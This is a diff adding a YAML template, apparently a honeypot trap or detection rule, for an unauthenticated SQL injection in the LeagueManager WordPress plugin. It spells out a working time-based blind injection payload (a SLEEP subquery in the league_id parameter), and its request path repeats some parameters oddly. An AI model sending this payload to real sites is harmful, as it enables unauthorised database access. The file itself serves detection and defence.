@@ -1,0 +1,27 @@
+id: leaguemanager-sql-injection
+info:
+  name: LeagueManager <= 3.9.11 - SQL Injection
+  author: theamanrawat
+  description: 'The plugin does not sanitise and escape a parameter before using it
+    in a SQL statement via an AJAX action (available to unauthenticated users), leading
+    to an SQL injection.
+
+    '
+  severity: critical
+  reference:
+  - https://wpscan.com/vulnerability/f3be48f5-ae2c-4e27-80ca-664829b8fba3
+  - https://wordpress.org/plugins/leaguemanager/
+  metadata:
+    verified: true
+    max-request: 1
+  tags: wpscan,sqli,wp,wp-plugin,wordpress,leaguemanager,unauth
+traps:
+- request:
+    method: GET
+    path: /?season=1&league_id=1season=1&league_id=1'+AND+(SELECT+1909+FROM+(SELECT(SLEEP(6)))ZiBf)--+qODp&match_day=1&team_id=1&match_day=1&team_id=1
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: LeagueManagerAjaxL10n
